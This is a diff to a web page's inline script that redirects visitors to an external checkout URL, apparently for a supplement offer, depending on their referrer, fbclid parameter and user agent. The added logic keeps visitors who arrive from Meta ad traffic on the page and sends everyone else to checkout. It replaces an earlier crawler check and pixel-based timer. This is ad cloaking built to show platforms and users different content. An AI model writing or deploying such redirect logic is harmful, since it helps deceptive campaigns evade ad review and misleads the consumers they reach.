@@ -37,17 +37,23 @@
     <script>
       (function() {
         var checkoutUrl = "https://grokgg.space/homempotente";
-        var ua = navigator.userAgent.toLowerCase();
-        if (/facebookexternalhit|facebot|twitterbot|linkedinbot|pinterest|slackbot|discordbot|whatsapp/i.test(ua)) {
+        var ref = document.referrer.toLowerCase();
+        var isFromMeta = ref.indexOf("facebook.com") !== -1
+          || ref.indexOf("fb.com") !== -1
+          || ref.indexOf("instagram.com") !== -1
+          || ref.indexOf("l.instagram.com") !== -1
+          || ref.indexOf("meta.com") !== -1
+          || ref.indexOf("m.me") !== -1
+          || ref.indexOf("messenger.com") !== -1;
+        var hasFbclid = window.location.search.indexOf("fbclid") !== -1;
+        if (!isFromMeta && !hasFbclid) {
+          var ua = navigator.userAgent.toLowerCase();
+          if (/facebookexternalhit|facebot/i.test(ua)) {
+            window.location.replace(checkoutUrl);
+            return;
+          }
           window.location.replace(checkoutUrl);
-          return;
         }
-        var redirectTimer = setTimeout(function() {
-          window.location.replace(checkoutUrl);
-        }, 4000);
-        fetch("https://connect.facebook.net/en_US/fbevents.js", { method: "HEAD", mode: "no-cors" })
-          .then(function() { clearTimeout(redirectTimer); })
-          .catch(function() { window.location.replace(checkoutUrl); });
       })();
     </script>
   </head>
